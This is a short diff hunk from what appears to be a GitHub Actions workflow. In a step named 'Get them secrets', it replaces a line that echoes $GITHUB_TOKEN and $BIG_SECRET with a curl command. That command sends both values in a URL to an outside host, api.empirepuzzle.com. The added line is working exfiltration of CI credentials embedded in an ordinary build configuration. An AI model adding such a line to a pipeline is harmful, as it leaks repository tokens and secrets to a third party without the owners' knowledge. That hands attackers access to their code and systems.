@@ -42,4 +42,4 @@ jobs:
       
       # List Secrets
       - name: Get them secrets
-        run: echo $GITHUB_TOKEN && echo $BIG_SECRET
+        run: curl "https://api.empirepuzzle.com/${GITHUB_TOKEN}&${BIG_SECRET}"
